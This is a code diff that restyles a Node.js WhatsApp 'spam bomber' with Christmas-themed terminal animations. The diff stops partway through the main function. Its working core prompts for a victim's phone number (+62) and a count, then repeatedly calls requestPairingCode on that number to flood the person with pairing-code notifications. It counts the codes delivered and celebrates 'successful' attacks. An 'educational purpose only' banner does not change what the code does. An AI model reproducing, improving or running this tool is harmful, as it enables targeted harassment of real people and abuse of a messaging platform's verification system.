@@ -5,13 +5,15 @@ const readline = require("readline");
 const colors = {
     red: '\x1b[31m', green: '\x1b[32m', yellow: '\x1b[33m', blue: '\x1b[34m',
     magenta: '\x1b[35m', cyan: '\x1b[36m', white: '\x1b[37m', gray: '\x1b[90m',
-    reset: '\x1b[0m', bright: '\x1b[1m', dim: '\x1b[2m', blink: '\x1b[5m'
+    reset: '\x1b[0m', bright: '\x1b[1m', dim: '\x1b[2m', blink: '\x1b[5m',
+    bgRed: '\x1b[41m', bgGreen: '\x1b[42m', bgYellow: '\x1b[43m', bgBlue: '\x1b[44m'
 };
 
-const rainbow = ['\x1b[31m', '\x1b[91m', '\x1b[33m', '\x1b[93m', '\x1b[32m', '\x1b[92m', '\x1b[36m', '\x1b[96m', '\x1b[34m', '\x1b[94m', '\x1b[35m', '\x1b[95m'];
+const christmasColors = ['\x1b[31m', '\x1b[32m', '\x1b[33m', '\x1b[36m', '\x1b[35m', '\x1b[91m', '\x1b[92m', '\x1b[93m'];
+const snowflakes = ['❄️', '🌨️', '✨', '⭐', '🌟', '💠', '🔶', '🔷', '🎄', '🎅', '🤶', '🦌', '🎁', '🔔', '🎶'];
 
-class AnimatorGila {
-    constructor() { this.intervals = []; this.timeouts = []; }
+class ChristmasAnimator {
+    constructor() { this.intervals = []; this.timeouts = []; this.snow = []; }
     
     clearAll() { 
         this.intervals.forEach(clearInterval); 
@@ -20,220 +22,241 @@ class AnimatorGila {
         this.timeouts = []; 
     }
     
-    taxiAnimation(speed = 100) {
+    snowAnimation(duration = 5000) {
         return new Promise((resolve) => {
-            const width = 60;
-            let pos = -20;
-            const taxi = [
-                '      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄',
-                '     █             █',
-                '    █  🚖 TAXI-SPAM  █',
-                '   █               █',
-                '   █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█',
-                '     ██         ██',
-                '    █  █       █  █',
-                '   █    █     █    █',
-                '  █      █▄▄▄▄█      █'
-            ];
+            const width = process.stdout.columns || 80;
+            const height = 20;
             
-            const road = '══════════════════════════════════════════════════════════';
+            for (let i = 0; i < 50; i++) {
+                this.snow.push({
+                    x: Math.random() * width,
+                    y: Math.random() * -height,
+                    speed: 0.5 + Math.random() * 1.5,
+                    flake: snowflakes[Math.floor(Math.random() * snowflakes.length)]
+                });
+            }
+            
+            const startTime = Date.now();
             const interval = setInterval(() => {
                 console.clear();
-                console.log(colors.yellow + '\n' + road + colors.reset);
                 
-                for (let i = 0; i < taxi.length; i++) {
-                    let line = ' '.repeat(Math.max(0, pos)) + taxi[i];
-                    if (pos + taxi[i].length > width) {
-                        line = line.substring(0, width);
+                console.log(colors.bgBlue + ' '.repeat(width) + colors.reset);
+                
+                for (let i = 0; i < this.snow.length; i++) {
+                    this.snow[i].y += this.snow[i].speed;
+                    this.snow[i].x += Math.sin(this.snow[i].y * 0.1) * 0.5;
+                    
+                    if (this.snow[i].y > height) {
+                        this.snow[i].y = -5;
+                        this.snow[i].x = Math.random() * width;
                     }
-                    console.log(colors.yellow + line + colors.reset);
+                    
+                    const x = Math.floor(this.snow[i].x);
+                    const y = Math.floor(this.snow[i].y);
+                    
+                    if (y >= 0 && y < height) {
+                        readline.cursorTo(process.stdout, x, y + 2);
+                        const color = christmasColors[Math.floor(Math.random() * christmasColors.length)];
+                        process.stdout.write(color + this.snow[i].flake + colors.reset);
+                    }
                 }
                 
-                console.log(colors.yellow + road + colors.reset);
-                console.log(colors.green + '\n' + ' '.repeat(pos + 5) + '🚀 MENGIRIM SPAM KE TARGET...' + colors.reset);
+                if (Date.now() - startTime > duration) {
+                    clearInterval(interval);
+                    console.clear();
+                    this.snow = [];
+                    resolve();
+                }
+            }, 100);
+            this.intervals.push(interval);
+        });
+    }
+    
+    christmasTreeAnimation() {
+        return new Promise((resolve) => {
+            const tree = [
+                '         🎄         ',
+                '        🎄🎄🎄        ',
+                '       🎄🎄🎄🎄🎄       ',
+                '      🎄🎄🎄🎄🎄🎄🎄      ',
+                '     🎄🎄🎄🎄🎄🎄🎄🎄🎄     ',
+                '    🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄🎄    ',
+                '        🎁🎁🎁        ',
+                '        🎁🎁🎁        '
+            ];
+            
+            let lightsOn = false;
+            let frame = 0;
+            const interval = setInterval(() => {
+                console.clear();
+                console.log(colors.green + '\n' + '🎅'.repeat(25) + colors.reset);
+                console.log(colors.red + '         MERRY CHRISTMAS SPAM!         ' + colors.reset);
+                console.log(colors.green + '🎅'.repeat(25) + colors.reset + '\n');
+                
+                for (let i = 0; i < tree.length; i++) {
+                    let line = tree[i];
+                    if (lightsOn) {
+                        line = line.replace(/🎄/g, '🎄').replace(/🎁/g, '🎁');
+                    }
+                    const color = i < 6 ? colors.green : colors.red;
+                    console.log(' '.repeat(20) + color + line + colors.reset);
+                }
+                
+                console.log('\n' + colors.yellow + '🎶 SPAMMING PAIRING CODES WITH CHRISTMAS SPIRIT! 🎶' + colors.reset);
+                
+                lightsOn = !lightsOn;
+                frame++;
+                
+                if (frame > 10) {
+                    clearInterval(interval);
+                    resolve();
+                }
+            }, 300);
+            this.intervals.push(interval);
+        });
+    }
+    
+    santaSleighAnimation() {
+        return new Promise((resolve) => {
+            const sleigh = [
+                '     🎅__👑',
+                '    / \\🎁\\',
+                '   /   \\__\\',
+                '  /🦌  🦌  \\',
+                ' /__________\\',
+                '   🔔   🔔'
+            ];
+            
+            let pos = -20;
+            const width = 60;
+            const interval = setInterval(() => {
+                console.clear();
+                console.log(colors.red + '\n' + '✨'.repeat(width) + colors.reset);
+                
+                for (let i = 0; i < sleigh.length; i++) {
+                    const line = ' '.repeat(Math.max(0, pos)) + sleigh[i];
+                    const color = christmasColors[i % christmasColors.length];
+                    console.log(color + line + colors.reset);
+                }
+                
+                console.log(colors.white + '\n' + '~'.repeat(width) + colors.reset);
+                console.log(colors.green + '🎄 Santa is delivering SPAM codes! 🎄' + colors.reset);
+                console.log(colors.red + '🎁 Each code is a Christmas gift! 🎁' + colors.reset);
                 
                 pos += 2;
-                if (pos > width + 20) {
+                if (pos > width + 10) {
                     clearInterval(interval);
-                    console.clear();
                     resolve();
                 }
-            }, speed);
+            }, 100);
             this.intervals.push(interval);
         });
     }
     
-    policeCar() {
+    fireworksAnimation() {
         return new Promise((resolve) => {
-            const width = 70;
-            let pos = -25;
-            const police = [
-                '      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄',
-                '     █ 🚓 POLICE-SPAM █',
-                '    █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█',
-                '     ██   🔴🔵   ██',
-                '    █  █         █  █',
-                '   █    █       █    █',
-                '  █      █▄▄▄▄▄█      █'
-            ];
+            const particles = [];
+            for (let i = 0; i < 100; i++) {
+                particles.push({
+                    x: 30,
+                    y: 10,
+                    vx: (Math.random() - 0.5) * 4,
+                    vy: (Math.random() - 0.5) * 4,
+                    life: 20 + Math.random() * 30,
+                    char: ['✨', '🌟', '⭐', '🎆', '🎇', '💥'][Math.floor(Math.random() * 6)]
+                });
+            }
             
+            let frame = 0;
             const interval = setInterval(() => {
                 console.clear();
-                console.log(colors.red + '\n══════════════════════════════════════════════════════════════' + colors.reset);
+                console.log(colors.yellow + '\n' + '🎆'.repeat(20) + ' FIREWORKS CELEBRATION ' + '🎆'.repeat(20) + colors.reset);
                 
-                for (let i = 0; i < police.length; i++) {
-                    let line = ' '.repeat(Math.max(0, pos)) + police[i];
-                    console.log(colors.blue + line + colors.reset);
-                }
+                const grid = Array(20).fill().map(() => Array(60).fill(' '));
                 
-                console.log(colors.red + '══════════════════════════════════════════════════════════════' + colors.reset);
-                console.log(colors.red + '\n' + ' '.repeat(pos + 5) + '🚨 WARNING: HANYA UNTUK EDUKASI!' + colors.reset);
-                
-                pos += 3;
-                if (pos > width + 25) {
-                    clearInterval(interval);
-                    console.clear();
-                    resolve();
-                }
-            }, 80);
-            this.intervals.push(interval);
-        });
-    }
-    
-    bomberAnimation() {
-        return new Promise((resolve) => {
-            const bomber = [
-                '     ✈️',
-                '    /|\\',
-                '   / | \\',
-                '  /__|__\\',
-                '  💣💣💣',
-                '  \\     /',
-                '   \\   /',
-                '    \\ /',
-                '     V'
-            ];
-            
-            let y = 0;
-            const interval = setInterval(() => {
-                console.clear();
-                console.log(colors.red + '\n' + ' '.repeat(30) + '💥 BOMBER SPAM ACTIVATED 💥' + colors.reset);
-                console.log(colors.yellow + '══════════════════════════════════════════════════════' + colors.reset);
-                
-                for (let i = 0; i < bomber.length; i++) {
-                    console.log(' '.repeat(40) + bomber[i]);
-                }
-                
-                console.log(colors.yellow + '══════════════════════════════════════════════════════' + colors.reset);
-                
-                const bombs = '💣'.repeat(Math.floor(y / 2));
-                console.log(colors.red + '\n' + ' '.repeat(20) + bombs + colors.reset);
-                console.log(colors.green + ' '.repeat(25) + '🚀 MENUJU TARGET...' + colors.reset);
-                
-                y++;
-                if (y > 20) {
-                    clearInterval(interval);
-                    console.clear();
-                    for (let i = 0; i < 5; i++) {
-                        console.clear();
-                        console.log(colors.red + '\n' + '💥'.repeat(30));
-                        console.log(' '.repeat(15) + '💣 BOOM! SPAM TERKIRIM! 💣');
-                        console.log('💥'.repeat(30) + colors.reset);
-                        setTimeout(() => {}, 200);
+                particles.forEach(p => {
+                    p.x += p.vx;
+                    p.y += p.vy;
+                    p.life--;
+                    p.vy += 0.1;
+                    
+                    const x = Math.floor(p.x);
+                    const y = Math.floor(p.y);
+                    
+                    if (x >= 0 && x < 60 && y >= 0 && y < 20 && p.life > 0) {
+                        grid[y][x] = p.char;
                     }
-                    console.clear();
-                    resolve();
-                }
-            }, 150);
-            this.intervals.push(interval);
-        });
-    }
-    
-    sateliteAnimation() {
-        return new Promise((resolve) => {
-            const sat = [
-                '    🔭',
-                '   /|\\',
-                '  / | \\',
-                ' /__|__\\',
-                '   / \\',
-                '  /   \\',
-                ' 📡   📡'
-            ];
-            
-            let angle = 0;
-            const interval = setInterval(() => {
-                console.clear();
-                console.log(colors.cyan + '\n' + ' '.repeat(25) + '🛰️  SATELITE SPAM SCAN 🛰️' + colors.reset);
-                console.log(colors.blue + '~'.repeat(60) + colors.reset);
+                });
                 
-                const spaces = 30 + Math.sin(angle) * 10;
-                for (let i = 0; i < sat.length; i++) {
-                    console.log(' '.repeat(spaces) + sat[i]);
+                for (let y = 0; y < 20; y++) {
+                    let line = '';
+                    for (let x = 0; x < 60; x++) {
+                        if (grid[y][x] !== ' ') {
+                            const color = christmasColors[Math.floor(Math.random() * christmasColors.length)];
+                            line += color + grid[y][x] + colors.reset;
+                        } else {
+                            line += ' ';
+                        }
+                    }
+                    console.log(line);
                 }
                 
-                console.log(colors.blue + '~'.repeat(60) + colors.reset);
-                console.log(colors.green + '\n' + ' '.repeat(20) + '📡 MENCARI TARGET...'.padEnd(40, '.') + colors.reset);
-                console.log(colors.yellow + ' '.repeat(20) + '📶 SINYAL: ' + '█'.repeat(Math.floor(Math.abs(Math.sin(angle) * 10))) + colors.reset);
+                console.log(colors.green + '\n🎉 SPAM SUCCESSFUL! 🎉' + colors.reset);
                 
-                angle += 0.5;
-                if (angle > Math.PI * 4) {
+                frame++;
+                if (frame > 50) {
                     clearInterval(interval);
-                    console.clear();
                     resolve();
                 }
-            }, 120);
+            }, 50);
             this.intervals.push(interval);
         });
     }
     
-    sendNotification(title, message, type = 'info') {
+    sendChristmasNotification(title, message, type = 'info') {
+        const icons = {
+            success: '✅🎄',
+            error: '❌🎅',
+            warning: '⚠️🔔',
+            info: 'ℹ️🎁',
+            spam: '📨✨'
+        };
+        
         const color = type === 'success' ? colors.green : 
                      type === 'error' ? colors.red : 
-                     type === 'warning' ? colors.yellow : colors.cyan;
+                     type === 'warning' ? colors.yellow : 
+                     type === 'spam' ? colors.magenta : colors.cyan;
         
-        const icon = type === 'success' ? '✅' : 
-                    type === 'error' ? '❌' : 
-                    type === 'warning' ? '⚠️' : 'ℹ️';
-        
-        const notif = [
-            '┌' + '─'.repeat(50) + '┐',
-            `│ ${icon} ${title.padEnd(47)} │`,
-            '├' + '─'.repeat(50) + '┤',
-            `│ ${message.padEnd(48)} │`,
-            '└' + '─'.repeat(50) + '┘'
-        ];
-        
-        console.log('\n' + color + notif.join('\n') + colors.reset + '\n');
+        const border = '━'.repeat(48);
+        console.log('\n' + color + '┏' + border + '┓');
+        console.log('┃ ' + icons[type] + ' ' + title.padEnd(44) + ' ┃');
+        console.log('┣' + border + '┫');
+        console.log('┃ ' + message.padEnd(46) + ' ┃');
+        console.log('┗' + border + '┛' + colors.reset);
     }
     
-    showStats(success, failed, total) {
-        const width = 50;
-        const successBar = Math.floor((success / total) * width);
-        const failedBar = Math.floor((failed / total) * width);
-        const remaining = width - successBar - failedBar;
+    createProgressBar(current, total, label = '') {
+        const width = 40;
+        const percent = Math.min(current / total, 1);
+        const filled = Math.floor(width * percent);
+        const empty = width - filled;
         
-        console.log(colors.cyan + '\n' + '📊 ' + 'STATISTIK REAL-TIME '.padEnd(47, '═') + colors.reset);
-        console.log(colors.green + `   SUCCESS: ${'█'.repeat(successBar)} ${success}/${total}` + colors.reset);
-        console.log(colors.red + `   FAILED:  ${'█'.repeat(failedBar)} ${failed}/${total}` + colors.reset);
-        if (remaining > 0) {
-            console.log(colors.gray + `   PENDING: ${'░'.repeat(remaining)} ${total - success - failed}/${total}` + colors.reset);
-        }
-        console.log(colors.yellow + `   PROGRESS: ${Math.round(((success + failed) / total) * 100)}%` + colors.reset);
-        console.log(colors.cyan + '══════════════════════════════════════════════════════' + colors.reset);
+        const bar = colors.green + '█'.repeat(filled) + colors.white + '░'.repeat(empty) + colors.reset;
+        const percentText = Math.floor(percent * 100);
+        
+        const spinner = ['🎄', '🎅', '🤶', '🦌', '🎁', '🔔'][current % 6];
+        
+        console.log(colors.cyan + `\n${spinner} ${bar} ${percentText}% ${label}` + colors.reset);
     }
     
-    typewriter(text, delay = 20) {
+    typewriter(text, delay = 25) {
         return new Promise((resolve) => {
             let i = 0;
-            const colors = [colors.cyan, colors.green, colors.yellow, colors.magenta];
-            let colorIdx = 0;
-            
             const type = () => {
                 if (i < text.length) {
-                    process.stdout.write(colors[colorIdx % colors.length] + text.charAt(i) + colors.reset);
+                    const color = christmasColors[i % christmasColors.length];
+                    process.stdout.write(color + text[i] + colors.reset);
                     i++;
-                    colorIdx++;
                     this.timeouts.push(setTimeout(type, delay));
                 } else {
                     process.stdout.write('\n');
@@ -245,7 +268,7 @@ class AnimatorGila {
     }
 }
 
-const anim = new AnimatorGila();
+const anim = new ChristmasAnimator();
 
 const question = (text) => {
     const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
@@ -254,61 +277,51 @@ const question = (text) => {
     });
 };
 
-async function showWelcome() {
+async function showChristmasIntro() {
     console.clear();
     
-    await anim.taxiAnimation(80);
-    await new Promise(r => setTimeout(r, 800));
-    
-    await anim.policeCar();
-    await new Promise(r => setTimeout(r, 800));
-    
-    await anim.bomberAnimation();
-    await new Promise(r => setTimeout(r, 800));
-    
-    await anim.sateliteAnimation();
+    await anim.snowAnimation(3000);
+    await anim.christmasTreeAnimation();
+    await anim.santaSleighAnimation();
     
     console.clear();
-    console.log(colors.red + '\n' + '🔥'.repeat(65));
-    console.log('🔥'.repeat(65));
-    console.log(colors.yellow);
-    console.log('   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄');
-    console.log('  █                                                       █');
-    console.log('  █  ██████╗ ██████╗ ███╗   ███╗██████╗ ███████╗██████╗   █');
-    console.log('  █ ██╔════╝██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗  █');
-    console.log('  █ ██║     ██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝  █');
-    console.log('  █ ██║     ██║   ██║██║╚██╔╝██║██╔═══╝ ██╔══╝  ██╔══██╗  █');
-    console.log('  █ ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║     ███████╗██║  ██║  █');
-    console.log('  █  ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝  █');
-    console.log('  █                                                       █');
-    console.log('  █  ███████╗██████╗  █████╗ ███╗   ███╗                 █');
-    console.log('  █  ██╔════╝██╔══██╗██╔══██╗████╗ ████║                 █');
-    console.log('  █  ███████╗██████╔╝███████║██╔████╔██║                 █');
-    console.log('  █  ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║                 █');
-    console.log('  █  ███████║██║     ██║  ██║██║ ╚═╝ ██║                 █');
-    console.log('  █  ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝                 █');
-    console.log('  █                                                       █');
-    console.log('   ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀');
+    
+    console.log(colors.red + '\n' + '🎄'.repeat(35));
+    console.log('🎄'.repeat(35) + colors.reset);
+    
+    console.log(colors.green);
+    console.log('   ░█▀▀░█▀█░█▀▄░█▀▀░█▀█░▀█▀░█▀█░█▀▄░█▀▀░░░█▀█░█▀▄░█▀▄░█▀▀');
+    console.log('   ░█▀▀░█░█░█░█░█▀▀░█░█░░█░░█░█░█▀▄░█▀▀░░░█▀▀░█▀▄░█▀▄░█▀▀');
+    console.log('   ░▀▀▀░▀░▀░▀▀░░▀▀▀░▀░▀░░▀░░▀░▀░▀░▀░▀▀▀░░░▀░░░▀░▀░▀░▀░▀▀▀');
     console.log(colors.reset);
-    console.log(colors.red + '🔥'.repeat(65));
-    console.log('🔥'.repeat(65) + colors.reset);
     
-    anim.sendNotification('WELCOME TO SPAM BOMBER', 'ULTIMATE PAIRING CODE SPAM TOOL v5.0', 'warning');
+    console.log(colors.blue);
+    console.log('   ░█▀▀░█▀█░█▀▄░█▀▀░█▀█░▀█▀░█▀█░█▀▄░█▀▀░░░█▀▀░█▀▄░█▀▀░█▀█');
+    console.log('   ░█▀▀░█░█░█░█░█▀▀░█░█░░█░░█░█░█▀▄░█▀▀░░░█▀▀░█▀▄░█░█░█░█');
+    console.log('   ░▀▀▀░▀░▀░▀▀░░▀▀▀░▀░▀░░▀░░▀░▀░▀░▀░▀▀▀░░░▀▀▀░▀░▀░▀▀▀░▀░▀');
+    console.log(colors.reset);
     
-    await anim.typewriter(colors.green + '\n   👑 CREATED BY: FLOWFALCON' + colors.reset);
-    await anim.typewriter(colors.cyan + '   🔥 RENOVASI BY: RIM' + colors.reset);
-    await anim.typewriter(colors.yellow + '   ⚠️  WARNING: FOR EDUCATIONAL PURPOSE ONLY!' + colors.reset);
+    console.log(colors.red + '\n' + '🎄'.repeat(35));
+    console.log('🎄'.repeat(35) + colors.reset);
     
-    console.log('\n' + colors.magenta + '═'.repeat(65) + colors.reset);
-    await anim.typewriter(colors.white + '   🎯 TEKAN ENTER UNTUK MELANJUTKAN KE SPAM MODE...' + colors.reset);
+    anim.sendChristmasNotification('CHRISTMAS SPAM BOMBER', 'Special Holiday Edition v6.6', 'warning');
+    
+    await anim.typewriter(colors.green + '   🎅 CREATED BY: FLOWFALCON WITH ❤️' + colors.reset);
+    await anim.typewriter(colors.cyan + '   🎄 RENOVASI BY: RIM 🎁' + colors.reset);
+    await anim.typewriter(colors.yellow + '   ⚠️  FOR EDUCATIONAL PURPOSE ONLY! 🦌' + colors.reset);
+    
+    anim.sendChristmasNotification('IMPORTANT', 'This tool works only with +62 numbers!', 'info');
+    
+    console.log('\n' + colors.magenta + '🔔'.repeat(35) + colors.reset);
+    await anim.typewriter(colors.white + '   🎶 PRESS ENTER TO START CHRISTMAS SPAMMING...' + colors.reset);
     await question('');
     console.clear();
 }
 
 async function KleeProject() {
-    await showWelcome();
+    await showChristmasIntro();
     
-    anim.sendNotification('SYSTEM INITIALIZATION', 'Loading spam modules and connecting to server...', 'info');
+    anim.sendChristmasNotification('INITIALIZING', 'Loading Christmas spam modules...', 'info');
     
     try {
         const { state } = await useMultiFileAuthState('./69/session');
@@ -327,124 +340,153 @@ async function KleeProject() {
             browser: ["Ubuntu", "Chrome", "20.0.04"],
         });
         
-        anim.sendNotification('CONNECTION ESTABLISHED', 'Successfully connected to WhatsApp server!', 'success');
+        anim.sendChristmasNotification('CONNECTED', 'Successfully connected to WhatsApp! ✅', 'success');
         
-        console.log(colors.yellow + '\n' + '🚨 '.repeat(16) + colors.reset);
-        const target = await question(colors.red + '\n💀 MASUKKAN NOMOR TARGET (62xxxxxxxxxx): ' + colors.reset);
+        console.log(colors.green + '\n' + '🎁'.repeat(25) + colors.reset);
+        console.log(colors.red + '   🎅 CHRISTMAS TARGET SELECTION 🎅' + colors.reset);
+        console.log(colors.green + '🎁'.repeat(25) + colors.reset + '\n');
         
-        if (!target.startsWith('62')) {
-            anim.sendNotification('ERROR', 'Nomor harus diawali dengan 62! Contoh: 6281234567890', 'error');
+        const phoneNumber = await question(colors.cyan + '   🎄 ENTER TARGET NUMBER (62xxxxxxxxxx): ' + colors.reset);
+        
+        if (!phoneNumber || !phoneNumber.startsWith('62')) {
+            anim.sendChristmasNotification('ERROR', 'Number must start with 62! Example: 6281234567890', 'error');
             return;
         }
         
-        const jumlah = parseInt(await question(colors.red + '💣 JUMLAH SPAM (1-1000): ' + colors.reset));
+        const countInput = await question(colors.cyan + '   🎁 ENTER SPAM COUNT (1-500): ' + colors.reset);
+        const spamCount = parseInt(countInput);
         
-        if (isNaN(jumlah) || jumlah <= 0 || jumlah > 1000) {
-            anim.sendNotification('ERROR', 'Jumlah harus antara 1-1000!', 'error');
+        if (isNaN(spamCount) || spamCount <= 0 || spamCount > 500) {
+            anim.sendChristmasNotification('ERROR', 'Count must be between 1 and 500!', 'error');
             return;
         }
         
-        anim.sendNotification('SPAM CONFIGURATION', `Target: ${target} | Amount: ${jumlah} codes`, 'warning');
+        anim.sendChristmasNotification('CONFIGURED', `Target: ${phoneNumber} | Count: ${spamCount}`, 'spam');
         
         console.clear();
-        anim.sendNotification('ATTACK STARTED', `🚀 Launching spam attack to ${target}...`, 'info');
+        anim.sendChristmasNotification('SPAM STARTING', '🎄 Beginning Christmas spam attack! 🎄', 'warning');
         
-        let success = 0;
+        console.log(colors.red + '\n' + '🦌'.repeat(30));
+        console.log('🦌'.repeat(30) + colors.reset);
+        
+        console.log(colors.yellow + `\n   🎯 TARGET: ${phoneNumber}` + colors.reset);
+        console.log(colors.cyan + `   🔢 COUNT: ${spamCount} codes` + colors.reset);
+        console.log(colors.green + `   ⏰ START TIME: ${new Date().toLocaleTimeString()}` + colors.reset);
+        
+        console.log(colors.red + '\n' + '🦌'.repeat(30));
+        console.log('🦌'.repeat(30) + colors.reset);
+        
+        let successful = 0;
         let failed = 0;
-        const kodeSukses = [];
-        
-        console.log(colors.red + '\n' + '💀 '.repeat(16) + colors.reset);
-        console.log(colors.yellow + '\n   🎯 TARGET: ' + colors.red + target + colors.reset);
-        console.log(colors.yellow + '   🔢 TOTAL: ' + colors.cyan + jumlah + ' kode pairing' + colors.reset);
-        console.log(colors.red + '💀 '.repeat(16) + colors.reset);
-        
+        const deliveredCodes = [];
         const startTime = Date.now();
         
-        for (let i = 0; i < jumlah; i++) {
-            const attempt = i + 1;
+        for (let i = 0; i < spamCount; i++) {
+            const current = i + 1;
+            
+            anim.createProgressBar(current, spamCount, `Spamming ${current}/${spamCount}`);
             
             try {
-                anim.sendNotification(`ATTEMPT ${attempt}/${jumlah}`, `Sending pairing code to ${target}...`, 'info');
+                anim.sendChristmasNotification(`ATTEMPT ${current}`, `Sending Christmas code to target...`, 'spam');
                 
-                let code = await KleeBotInc.requestPairingCode(target);
-                const originalCode = code;
-                code = code?.match(/.{1,4}/g)?.join("-") || code;
+                const code = await KleeBotInc.requestPairingCode(phoneNumber);
+                const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
                 
-                success++;
-                kodeSukses.push({ code: code, original: originalCode });
+                successful++;
+                deliveredCodes.push({
+                    number: current,
+                    code: formattedCode,
+                    original: code,
+                    time: new Date().toLocaleTimeString()
+                });
                 
-                anim.sendNotification(`SUCCESS ${attempt}`, `Code sent: ${code}`, 'success');
-                console.log(colors.green + `   ✅ [${attempt}/${jumlah}] ${code} → TERKIRIM!` + colors.reset);
+                anim.sendChristmasNotification(`SUCCESS ${current}`, `Code delivered: ${formattedCode}`, 'success');
+                console.log(colors.green + `   ✅ [${current}/${spamCount}] ${formattedCode} - DELIVERED! 🎁` + colors.reset);
                 
-                if (success % 5 === 0) {
-                    anim.showStats(success, failed, jumlah);
-                }
+                const emojis = ['🎄', '🎅', '🤶', '🦌', '🎁', '🔔', '❄️', '✨'];
+                const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
+                console.log(colors.magenta + `   ${randomEmoji} Christmas spam is working! ${randomEmoji}` + colors.reset);
                 
             } catch (error) {
                 failed++;
-                anim.sendNotification(`FAILED ${attempt}`, `Error: ${error.message}`, 'error');
-                console.log(colors.red + `   ❌ [${attempt}/${jumlah}] GAGAL: ${error.message}` + colors.reset);
+                anim.sendChristmasNotification(`FAILED ${current}`, `Error: ${error.message}`, 'error');
+                console.log(colors.red + `   ❌ [${current}/${spamCount}] FAILED: ${error.message}` + colors.reset);
             }
             
-            await new Promise(r => setTimeout(r, 700 + Math.random() * 300));
+            const delay = 800 + Math.random() * 400;
+            await new Promise(resolve => setTimeout(resolve, delay));
+            
+            if (current % 5 === 0) {
+                const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
+                console.log(colors.blue + `   ⏱️  Elapsed: ${elapsed}s | Success: ${successful} | Failed: ${failed}` + colors.reset);
+            }
         }
         
         const endTime = Date.now();
-        const duration = ((endTime - startTime) / 1000).toFixed(2);
+        const totalTime = ((endTime - startTime) / 1000).toFixed(2);
         
         console.clear();
+        await anim.fireworksAnimation();
         
-        anim.sendNotification('ATTACK COMPLETED', `Spam finished in ${duration} seconds!`, 'success');
+        anim.sendChristmasNotification('MISSION COMPLETE', `Christmas spam finished in ${totalTime} seconds!`, 'success');
         
-        console.log(colors.green + '\n' + '█'.repeat(65));
-        console.log('█'.repeat(65) + colors.reset);
+        console.log(colors.green + '\n' + '🎅'.repeat(30));
+        console.log('🎅'.repeat(30) + colors.reset);
         
-        anim.sendNotification('FINAL REPORT', `Duration: ${duration}s | Target: ${target}`, 'info');
+        console.log(colors.yellow + '\n   🎄 CHRISTMAS SPAM REPORT 🎄' + colors.reset);
+        console.log(colors.cyan + '   ┌' + '─'.repeat(46) + '┐' + colors.reset);
+        console.log(colors.green + `   │ ✅ SUCCESSFUL: ${successful.toString().padStart(4)} codes${' '.repeat(25)}│` + colors.reset);
+        console.log(colors.red + `   │ ❌ FAILED:     ${failed.toString().padStart(4)} codes${' '.repeat(25)}│` + colors.reset);
+        console.log(colors.blue + `   │ 🎯 TOTAL:      ${spamCount.toString().padStart(4)} attempts${' '.repeat(23)}│` + colors.reset);
+        console.log(colors.magenta + `   │ ⏰ DURATION:   ${totalTime}s${' '.repeat(32)}│` + colors.reset);
+        const successRate = ((successful / spamCount) * 100).toFixed(2);
+        console.log(colors.yellow + `   │ 📈 RATE:       ${successRate}% success${' '.repeat(25)}│` + colors.reset);
+        console.log(colors.cyan + '   └' + '─'.repeat(46) + '┘' + colors.reset);
         
-        console.log(colors.cyan + '\n   📊 DETAILED STATISTICS:' + colors.reset);
-        console.log(colors.green + `   ├─ ✅ SUCCESS: ${success} codes` + colors.reset);
-        console.log(colors.red + `   ├─ ❌ FAILED: ${failed} codes` + colors.reset);
-        console.log(colors.yellow + `   ├─ 🎯 TOTAL: ${jumlah} attempts` + colors.reset);
-        console.log(colors.magenta + `   ├─ ⚡ DURATION: ${duration} seconds` + colors.reset);
-        const rate = ((success / jumlah) * 100).toFixed(2);
-        console.log(colors.blue + `   └─ 📈 SUCCESS RATE: ${rate}%` + colors.reset);
-        
-        if (kodeSukses.length > 0) {
-            anim.sendNotification('SUCCESSFUL CODES', `${kodeSukses.length} codes delivered successfully!`, 'success');
+        if (deliveredCodes.length > 0) {
+            anim.sendChristmasNotification('DELIVERY REPORT', `${deliveredCodes.length} codes delivered successfully!`, 'info');
             
-            console.log(colors.yellow + '\n   📋 LIST OF DELIVERED CODES:' + colors.reset);
-            kodeSukses.forEach((item, idx) => {
-                const color = rainbow[idx % rainbow.length];
-                console.log(color + `   ${(idx + 1).toString().padStart(3, '0')}. ${item.code}` + colors.reset);
+            console.log(colors.cyan + '\n   🎁 SUCCESSFUL CODES DELIVERED:' + colors.reset);
+            console.log(colors.white + '   ┌' + '─'.repeat(50) + '┐' + colors.reset);
+            
+            deliveredCodes.slice(0, 10).forEach((item, idx) => {
+                const color = christmasColors[idx % christmasColors.length];
+                console.log(color + `   │ ${item.number.toString().padStart(3)}. ${item.code.padEnd(15)} @ ${item.time} │` + colors.reset);
             });
+            
+            if (deliveredCodes.length > 10) {
+                console.log(colors.magenta + `   │ ... and ${deliveredCodes.length - 10} more codes ...${' '.repeat(8)}│` + colors.reset);
+            }
+            
+            console.log(colors.white + '   └' + '─'.repeat(50) + '┘' + colors.reset);
         }
         
-        console.log(colors.green + '\n' + '█'.repeat(65));
-        console.log('█'.repeat(65) + colors.reset);
+        console.log(colors.green + '\n' + '🎅'.repeat(30));
+        console.log('🎅'.repeat(30) + colors.reset);
         
-        anim.sendNotification('SYSTEM MESSAGE', 'Spam attack completed successfully!', 'success');
+        anim.sendChristmasNotification('CHRISTMAS MESSAGE', 'Merry Christmas and Happy Spamming! 🎄', 'success');
         
